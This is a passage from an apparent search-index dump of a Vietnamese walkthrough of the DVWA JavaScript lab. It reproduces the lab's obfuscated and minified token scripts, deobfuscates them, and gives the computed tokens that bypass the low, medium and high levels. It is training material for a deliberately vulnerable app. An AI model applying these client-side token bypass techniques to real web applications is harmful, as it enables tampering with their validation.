&o]+m[(D>>20)&o]+m[(D>>16)&o]+m[(D>>12)&o]+m[(D>>8)&o]+m[(D>>4)&o]+m[D&o]}A\\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x202b=[(C>>24)&u,(C>>16)&u,(C>>8)&u,C&u,(B>>24)&u,(B>>16)&u,(B>>8)&u,B&u,(E>>24)&u,(E>>16)&u,(E>>8)&u,E&u,(F>>24)&u,(F>>16)&u,(F>>8)&u,F&u,(J>>24)&u,(J>>16)&u,(J>>8)&u,J&u,(I>>24)&u,(I>>16)&u,(I>>8)&u,I&u,(H>>24)&u,(H>>16)&u,(H>>8)&u,H&u];p(!k.x){2b.4A((D>>24)&u,(D>>16)&u,(D>>8)&u,D&u)}A\\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\\x201w=O\\x20Z(k.x?28:32);q\\x201i=O\\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\\x201w};w\\x201P(G,x,1v){q\\x20i,T=1c\\x20G;p(T===\\x272p\\x27){q\\x20L=[],W=G.W,M=0,r;1g(i=0;i<W;++i){r=G.1Q(i);p(r<R){L[M++]=r}z\\x20p(r<2v){L[M++]=(2t|(r>>6));L[M++]=(R|(r&V))}z\\x20p(r<2A||r>=2E){L[M++]=(2D|(r>>12));L[M++]=(R|((r>>6)&V));L[M++]=(R|(r&V))}z{r=2C+(((r&23)<<10)|(G.1Q(++i)&23));L[M++]=(2X|(r>>18));L[M++]=(R|((r>>12)&V));L[M++]=(R|((r>>6)&V));L[M++]=(R|(r&V))}}G=L}z{p(T===\\x271n\\x27){p(G===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&&G.1J===Z){G=O\\x202r(G)}z\\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}}p(G.W>1k){G=(O\\x20N(x,1d)).S(G).27()}q\\x201F=[],2e=[];1g(i=0;i<1k;++i){q\\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\\x20X})}}})();w\\x202y(e){1g(q\\x20t=\\x22\\x22,n=e.W-1;n>=0;n--)t+=e[n];A\\x20t}w\\x202J(t,y=\\x224B\\x22){1m.1o(\\x221M\\x22).1r=1q(1m.1o(\\x221M\\x22).1r+y)}w\\x202B(e=\\x224E\\x22){1m.1o(\\x221M\\x22).1r=1q(e+1m.1o(\\x221M\\x22).1r)}w\\x202K(a,b){1m.1o(\\x221M\\x22).1r=2y(1m.1o(\\x222F\\x22).1r)}1m.1o(\\x222F\\x22).1r=\\x22\\x22;4u(w(){2B(\\x224M\\x22)},4N);1m.1o(\\x224P\\x22).4Q(\\x224R\\x22,2J);2K(\\x223O\\x22,44);' , '||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW' , 'split' ];( function ( c , d ){ var e = function ( f ){ while ( -- f ){ c [ 'push' ]( c [ 'shift' ]());}}; e ( ++ d );}( a , 0x1f4 )); var b = function ( c , d ){ c = c - 0x0 ; var e = a [ c ]; return e ;}; eval ( function ( d , e , f , g , h , i ){ h = function ( j ){ return ( j < e ? '' : h ( parseInt ( j / e ))) + (( j = j % e ) > 0x23 ? String [ b ( '0x0' )]( j + 0x1d ) : j [ b ( '0x1' )]( 0x24 ));}; if ( ! '' [ b ( '0x2' )]( /^/ , String )){ while ( f -- ){ i [ h ( f )] = g [ f ] || h ( f );} g = [ function ( k ){ if ( 'wpA' !== b ( '0x3' )){ return i [ k ];} else { while ( f -- ){ i [ k ( f )] = g [ f ] || k ( f );} g = [ function ( l ){ return i [ l ];}]; k = function (){ return b ( '0x4' );}; f = 0x1 ;}}]; h = function (){ return b ( '0x4' );}; f = 0x1 ;}; while ( f -- ){ if ( g [ f ]){ if ( b ( '0x5' ) === b ( '0x6' )){ return i [ h ];} else { d = d [ b ( '0x2' )]( new RegExp ( '\\x5cb' + h ( f ) + '\\x5cb' , 'g' ), g [ f ]);}}} return d ;}( b ( '0x7' ), 0x3e , 0x137 , b ( '0x8' )[ b ( '0x9' )]( '|' ), 0x0 ,{})); Analysis \u00b6 V\u1edbi b\u00e0i n\u00e0y, ta th\u1ea5y \u0111o\u1ea1n code javascript kh\u00e1 kh\u00f3 hi\u1ec3u. Th\u00ec th\u1ef1c ra \u0111o\u1ea1n m\u00e3 n\u00e0y \u0111\u00e3 b\u1ecb Obfuscation , v\u00e0 ta s\u1ebd d\u00f9ng deobfuscate javascript \u0111\u1ec3 xem code. function do_something ( e ) { for ( var t = \"\" , n = e . length - 1 ; n >= 0 ; n -- ) t += e [ n ]; return t } function token_part_3 ( t , y = \"ZZ\" ) { document . getElementById ( \"token\" ). value = sha256 ( document . getElementById ( \"token\" ). value + y ) } function token_part_2 ( e = \"YY\" ) { document . getElementById ( \"token\" ). value = sha256 ( e + document . getElementById ( \"token\" ). value ) } function token_part_1 ( a , b ) { document . getElementById ( \"token\" ). value = do_something ( document . getElementById ( \"phrase\" ). value ) } document . getElementById ( \"phrase\" ). value = \"\" ; setTimeout ( function () { token_part_2 ( \"XX\" ) }, 300 ); document . getElementById ( \"send\" ). addEventListener ( \"click\" , token_part_3 ); token_part_1 ( \"ABCD\" , 44 ); Ta l\u01b0\u1ee3m nh\u1eb7t \u0111\u01b0\u1ee3c c\u00e1c d\u00f2ng quan tr\u1ecdng n\u1eb1m cu\u1ed1i \u0111o\u1ea1n code. L\u00fac n\u00e0y ta s\u1ebd ph\u00e2n t\u00edch xem tr\u00ecnh t\u1ef1 th\u1ef1c thi c\u1ee7a c\u00e1c h\u00e0m. Ta th\u1ea5y t\u1ed5ng c\u1ed9ng c\u00f3 3 h\u00e0m: token_part_1 - A token_part_2 - B token_part_3 - C C\u00e1i v\u1ea5n \u0111\u1ec1 nan gi\u1ea3i \u1edf \u0111\u00e2y l\u00e0 h\u00e0m setTimeout delay token_part_2() 300s, th\u00ec cho ta kh\u00f4ng bi\u1ebft \u0111\u01b0\u1ee3c th\u1ee9 t\u1ef1 ch\u00ednh x\u00e1c c\u1ee7a 3 h\u00e0m A, B, C ch\u1ea1y nh\u01b0 th\u1ebf n\u00e0o. Hi\u1ec3n nhi\u00ean khi test v\u1edbi console.log(\"A\"), console.log(\"B\"), console.log(\"C\") th\u00ec ta s\u1ebd th\u1ea5y \u0111\u01b0\u1ee3c th\u1ee9 t\u1ef1 g\u1ecdi l\u00e0 C - A - B. Nh\u01b0ng \u0111\u00e2y h\u1ecd d\u00f9ng SHA256 th\u00ec c\u00f3 th\u1ec3 th\u1eddi gian n\u00f3 ch\u00eanh l\u1ec7ch v\u00e0 d\u1eabn \u0111\u1ebfn th\u1ee9 t\u1ef1 g\u1ecdi c\u00e1c h\u00e0m kh\u00f4ng c\u00f2n \u0111\u00fang n\u1eefa. Well, sau m\u1ed9t v\u00e0i thao t\u00e1c th\u1eed, ta c\u00f3 th\u1ec3 th\u1ea5y \u0111\u01b0\u1ee3c th\u1ee9 t\u1ef1 g\u1ecdi \u0111\u00fang l\u00e0 C - A - B v\u00e0 token c\u1ea7n t\u00ecm l\u00e0 7f1bfaaf829f785ba5801d5bf68c1ecaf95ce04545462c8b8f311dfc9014068a \u0111\u01b0\u1ee3c l\u1ea5y t\u1eeb SHA256(XXsseccus) Exploition \u00b6 Khai th\u00e1c nh\u01b0 2 challenge tr\u01b0\u1edbc. H\u00e3y xem m\u1ed9t ph\u1ea7n chatGPT ph\u00e2n t\u00edch cho \u0111o\u1ea1n m\u00e3 javascript Sau khi g\u1ecdi token_part_3. Ngay l\u1eadp t\u1ee9c th\u1ef1c thi token_part_1 v\u00e0 c\u00f3 th\u1ec3 g\u1ea7n h\u1ebft 300s (l\u00e0 th\u1eddi \u0111i\u1ec3m token_part_2 \u0111\u01b0\u1ee3c g\u1ecdi). V\u00e0 token c\u1ea7n t\u00ecm l\u00e0 SHA256(XX + do_something(\"success\")) Security Level: Impossible \u00b6 You can never trust anything that comes from the user or prevent them from messing with it and so there is no impossible level. Spoiler \u00b6 Low Level \u00b6 All the JavaScript is included in the page. Read the source and work out what function is being used to generate the token required to match with the phrase and then call the function manually. Spoiler: Change the phrase to success and then use the function generate_token() to update the token. Medium Level \u00b6 The JavaScript has been broken out into its own file and then minimized. You need to view the source for the included file and then work out what it is doing. Both Firefox and Chrome have a Pretty Print feature which attempts to reverse the compression and display code in a readable way. Spoiler: The file uses the setTimeout function to run the do_elsesomething function which generates the token. High Level \u00b6 The JavaScript has been obfuscated by at least one engine. You are going to need to step through the code to work out what is useful, what is garbage and what is needed to complete the mission. Spoiler: If it helps, two packers have been used, the first is from Dan's Tools and the second is the JavaScript Obfuscator Tool . Spoiler 2: This deobfuscation tool seems to work the best on this code deobfuscate javascript . Spoiler 3: This is one way to do it... run the obfuscated JS through a deobfuscation app, intercept the response for the obfuscated JS and swap in the readable version. Work out the flow and you will see three functions that need to be called in order. Call the functions at the right time with the right parameters. Impossible Level \u00b6 You can never trust the user and have to assume that any code sent to the user can be manipulated or bypassed and so there is no impossible level. More Information \u00b6 https://www.w3schools.com/js/ https://www.youtube.com/watch?v=cs7EQdWO5o0&index=17&list=WL https://ponyfoo.com/articles/es6-proxies-in-depth","title":"JavaScript"},{"location":"dvwa/javascript/#javascript","text":"","title":"JavaScript"},{"location":"dvwa/javascript/#about","text":"The attacks in this section are designed to help you learn about how JavaScript is used in the browser and how it can be manipulated. The attacks could be carried out by just analysing network traffic, but that isn't the point and it would also probably be a lot harder.","title":"About"},{"location":"dvwa/javascript/#objective","text":"Simply submit the phrase \"success\" to win the level. Obviously, it isn't quite that easy, each level implements different protection mechanisms, the JavaScript included in the pages has to be analysed and then manipulated to bypass the protections. C\u00f4ng vi\u1ec7c c\u1ee7a ta cho to\u00e0n b\u1ed9 th\u1eed th\u00e1ch \u1edf ph\u1ea7n n\u00e0y l\u00e0 d\u1ecbch ng\u01b0\u1ee3c \u0111o\u1ea1n m\u00e3 JavaScript \u0111\u1ec3 t\u00ecm \u0111\u01b0\u1ee3c gi\u00e1 tr\u1ecb v\u00e0 truy\u1ec1n n\u00f3 v\u00e0o th\u1ebb <input> c\u00f3 id l\u00e0 token .","title":"Objective"},{"location":"dvwa/javascript/#security-level-low","text":"Source code vulnerabilities/javascript/source/low.php <?php $page [ 'body' ] .= <<< EOF <script> /* MD5 code from here https://github.com/blueimp/JavaScript-MD5 */ !function(n){\"use strict\";function t(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}function r(n,t){return n<<t|n>>>32-t}function e(n,e,o,u,c,f){return t(r(t(t(e,n),t(u,f)),c),o)}function o(n,t,r,o,u,c,f){return e(t&r|~t&o,n,t,u,c,f)}function u(n,t,r,o,u,c,f){return e(t&o|r&~o,n,t,u,c,f)}function c(n,t,r,o,u,c,f){return e(t^r^o,n,t,u,c,f)}function f(n,t,r,o,u,c,f){return e(r^(t|~o),n,t,u,c,f)}function i(n,r){n[r>>5]|=128<<r%32,n[14+(r+64>>>9<<4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e<n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]}function a(n){var t,r=\"\",e=32*n.length;for(t=0;t<e;t+=8)r+=String.fromCharCode(n[t>>5]>>>t%32&255);return r}function d(n){var t,r=[];for(r[(n.length>>2)-1]=void 0,t=0;t<r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t<e;t+=8)r[t>>5]|=(255&n.charCodeAt(t/8))<<t%32;return r}function h(n){return a(i(d(n),8*n.length))}function l(n,t){var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length>16&&(o=i(o,8*n.length)),r=0;r<16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))}function g(n){var t,r,e=\"\";for(r=0;r<n.length;r+=1)t=n.charCodeAt(r),e+=\"0123456789abcdef\".charAt(t>>>4&15)+\"0123456789abcdef\".charAt(15&t);return e}function v(n){return unescape(encodeURIComponent(n))}function m(n){return h(v(n))}function p(n){return g(m(n))}function s(n,t){return l(v(n),v(t))}function C(n,t){return g(s(n,t))}function A(n,t,r){return t?r?s(t,n):C(t,n):r?m(n):p(n)}\"function\"==typeof define&&define.amd?define(function(){return A}):\"object\"==typeof module&&module.exports?module.exports=A:n.md5=A}(this); function rot13(inp) { return inp.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c<=\"Z\"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);}); } function generate_token() { var phrase = document.getElementById(\"phrase\").value; document.getElementById(\"token\").value = md5(rot13(phrase)); } generate_token(); </script> EOF ; ?>","title":"Security Level: Low"},{"location":"dvwa/javascript/#analysis","text":"\u0110\u1ec3 \u00fd h\u00e0m generate_token () ta th\u1ea5y h\u00e0m n\u00e0y s\u1ebd t\u1ea1o token t\u1eeb keyword success m\u00e0 ta nh\u1eadp v\u00e0o. C\u00f4ng vi\u1ec7c c\u1ee7a ch\u00fang ta \u1edf th\u1eddi \u0111i\u1ec3m n\u00e0y l\u00e0 \u0111i\u1ec1u ch\u1ec9nh token h\u1ec7 th\u1ed1ng sinh ra th\u00e0nh token \u0111\u01b0\u1ee3c t\u1ea1o th\u00f4ng qua h\u00e0m generate_token () . Ch\u00fang ta s\u1ebd ho\u00e0n th\u00e0nh th\u1eed th\u00e1ch.","title":"Analysis"},{"location":"dvwa/javascript/#exploition","text":"F12 website ta th\u1ea5y d\u00f2ng token b\u1ecb hidden Ta s\u1ebd ti\u00eam 38581812b435834ebf84ebcc2c6424d6 (MD5(ROT13(success))) v\u00e0o token v\u00e0 s\u1ebd bypass \u0111\u01b0\u1ee3c challenge n\u00e0y. V\u00e0 xong, k\u1ebft qu\u1ea3 s\u1ebd hi\u1ec3n th\u1ecb nh\u01b0 h\u00ecnh b\u00ean d\u01b0\u1edbi","title":"Exploition"},{"location":"dvwa/javascript/#security-level-medium","text":"Source code vulnerabilities/javascript/source/medium.php <?php $page [ 'body' ] .= '<script src=\"' . DVWA_WEB_PAGE_TO_ROOT . 'vulnerabilities/javascript/source/medium.js\"></script>' ; ?> vulnerabilities/javascript/source/medium.js function do_something ( e ){ for ( var t = \"\" , n = e . length - 1 ; n >= 0 ; n -- ) t += e [ n ]; return t } setTimeout ( function (){ do_elsesomething ( \"XX\" )}, 300 ); function do_elsesomething ( e ){ document . getElementById ( \"token\" ). value = do_something ( e + document . getElementById ( \"phrase\" ). value + \"XX\" )}","title":"Security Level: Medium"},{"location":"dvwa/javascript/#analysis_1","text":"Nh\u1edd https://reqbin.com/code/javascript ta s\u1ebd t\u00ecm \u0111\u01b0\u1ee3c token mong mu\u1ed1n. medium.js function do_something ( e ) { for ( var t = \"\" , n = e . length - 1 ; n >= 0 ; n -- ) t += e [ n ]; return t } setTimeout ( function () { do_elsesomething ( \"XX\" ) }, 300 ); function do_elsesomething ( e ) { var a = do_something ( e + \"successXX\" ) console . log ( a ) }","title":"Analysis"},{"location":"dvwa/javascript/#exploition_1","text":"","title":"Exploition"},{"location":"dvwa/javascript/#security-level-high","text":"Source code vulnerabilities/javascript/source/high.php <?php $page [ 'body' ] .= '<script src=\"' . DVWA_WEB_PAGE_TO_ROOT . 'vulnerabilities/javascript/source/high.js\"></script>' ; ?> vulnerabilities/javascript/source/high.js var a = [ 'fromCharCode' , 'toString' , 'replace' , 'BeJ' , '\\x5cw+' , 'Lyg' , 'SuR' , '(w(){\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\\x202L=!1R&&1c\\x202M===\\x271n\\x27;q\\x202o=!Y.2S&&1c\\x202d===\\x271n\\x27&&2d.2Q&&2d.2Q.3S;p(2o){Y=3R}z\\x20p(2L){Y=2M}q\\x202G=!Y.3Q&&1c\\x202g===\\x271n\\x27&&2g.X;q\\x202s=1c\\x202l===\\x27w\\x27&&2l.3P;q\\x201y=!Y.3H&&1c\\x20Z!==\\x272T\\x27;q\\x20m=\\x273G\\x27.3z(\\x27\\x27);q\\x202w=[-3y,3x,3v,3w];q\\x20U=[24,16,8,0];q\\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\\x201E=[\\x271e\\x27,\\x2727\\x27,\\x271G\\x27,\\x272R\\x27];q\\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\\x204C.Q.2U.1I(1x)===\\x27[1n\\x201z]\\x27}}p(1y&&(Y.50||!Z.1N)){Z.1N=w(1x){A\\x201c\\x201x===\\x271n\\x27&&1x.1w&&1x.1w.1J===Z}}q\\x202m=w(1X,x){A\\x20w(s){A\\x20O\\x20N(x,1d).S(s)[1X]()}};q\\x202a=w(x){q\\x20P=2m(\\x271e\\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\\x20O\\x20N(x)};P.S=w(s){A\\x20P.1T().S(s)};1g(q\\x20i=0;i<1E.W;++i){q\\x20T=1E[i];P[T]=2m(T,x)}A\\x20P};q\\x202P=w(P,x){q\\x201S=2O(\\x222N(\\x271S\\x27)\\x22);q\\x201Y=2O(\\x222N(\\x271w\\x27).1Y\\x22);q\\x202n=x?\\x271H\\x27:\\x271q\\x27;q\\x202z=w(s){p(1c\\x20s===\\x272p\\x27){A\\x201S.2x(2n).S(s,\\x274S\\x27).1G(\\x271e\\x27)}z{p(s===2q||s===2T){1u\\x20O\\x201t(1l)}z\\x20p(s.1J===Z){s=O\\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\\x201S.2x(2n).S(O\\x201Y(s)).1G(\\x271e\\x27)}z{A\\x20P(s)}};A\\x202z};q\\x202k=w(1X,x){A\\x20w(G,s){A\\x20O\\x201P(G,x,1d).S(s)[1X]()}};q\\x202f=w(x){q\\x20P=2k(\\x271e\\x27,x);P.1T=w(G){A\\x20O\\x201P(G,x)};P.S=w(G,s){A\\x20P.1T(G).S(s)};1g(q\\x20i=0;i<1E.W;++i){q\\x20T=1E[i];P[T]=2k(T,x)}A\\x20P};w\\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\\x202h,T=1c\\x20s;p(T!==\\x272p\\x27){p(T===\\x271n\\x27){p(s===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&&s.1J===Z){s=O\\x202r(s)}z\\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}2h=1d}q\\x20r,M=0,i,W=s.W,l=k.l;4t(M<W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M<W&&i<1k;++M){l[i>>2]|=s[M]<<U[i++&3]}}z{1g(i=k.1A;M<W&&i<1k;++M){r=s.1Q(M);p(r<R){l[i>>2]|=r<<U[i++&3]}z\\x20p(r<2v){l[i>>2]|=(2t|(r>>6))<<U[i++&3];l[i>>2]|=(R|(r&V))<<U[i++&3]}z\\x20p(r<2A||r>=2E){l[i>>2]|=(2D|(r>>12))<<U[i++&3];l[i>>2]|=(R|((r>>6)&V))<<U[i++&3];l[i>>2]|=(R|(r&V))<<U[i++&3]}z{r=2C+(((r&23)<<10)|(s.1Q(++M)&23));l[i>>2]|=(2X|(r>>18))<<U[i++&3];l[i>>2]|=(R|((r>>12)&V))<<U[i++&3];l[i>>2]|=(R|((r>>6)&V))<<U[i++&3];l[i>>2]|=(R|(r&V))<<U[i++&3]}}}k.2u=i;k.L+=i-k.1A;p(i>=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L>4r){k.2i+=k.L/2H<<0;k.L=k.L%2H}A\\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\\x20l=k.l,i=k.2u;l[16]=k.1C;l[i>>2]|=2w[i&3];k.1C=l[16];p(i>=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i<<3|k.L>>>29;l[15]=k.L<<3;k.1W()};N.Q.1W=w(){q\\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j<1k;++j){v=l[j-15];1a=((v>>>7)|(v<<25))^((v>>>18)|(v<<14))^(v>>>3);v=l[j-2];1b=((v>>>17)|(v<<15))^((v>>>19)|(v<<13))^(v>>>10);l[j]=l[j-16]+1a+l[j-7]+1b<<0}1D=b&c;1g(j=0;j<1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o<<0;d=v+4p<<0}z{1B=4v;v=l[0]-4w;h=v-4G<<0;d=v+4D<<0}k.2j=1O}z{1a=((a>>>2)|(a<<30))^((a>>>13)|(a<<19))^((a>>>22)|(a<<10));1b=((e>>>6)|(e<<26))^((e>>>11)|(e<<21))^((e>>>25)|(e<<7));1B=a&b;1j=1B^(a&c)^1D;1h=(e&f)^(~e&g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v<<0;d=v+1f<<0}1a=((d>>>2)|(d<<30))^((d>>>13)|(d<<19))^((d>>>22)|(d<<10));1b=((h>>>6)|(h<<26))^((h>>>11)|(h<<21))^((h>>>25)|(h<<7));1Z=d&a;1j=1Z^(d&b)^1B;1h=(h&e)^(~h&f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v<<0;c=v+1f<<0;1a=((c>>>2)|(c<<30))^((c>>>13)|(c<<19))^((c>>>22)|(c<<10));1b=((g>>>6)|(g<<26))^((g>>>11)|(g<<21))^((g>>>25)|(g<<7));1V=c&d;1j=1V^(c&a)^1Z;1h=(g&h)^(~g&e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1